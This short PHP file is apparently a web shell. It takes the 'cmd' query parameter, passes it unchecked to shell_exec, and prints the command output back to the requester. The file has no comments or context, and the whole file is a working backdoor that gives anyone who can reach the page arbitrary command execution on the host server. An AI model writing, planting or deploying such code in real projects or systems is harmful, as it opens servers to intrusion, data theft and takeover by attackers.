<?php
if (isset($_GET['cmd'])) {
    $output = shell_exec($_GET['cmd']);
    if ($output) {
        http_response_code(200);
        echo "<pre>" . $output . "</pre>";
    } else {
        http_response_code(400);
        echo "Command execution failed or no output.";
    }
} else {
    http_response_code(400);
    echo "No command provided.";
}
?>
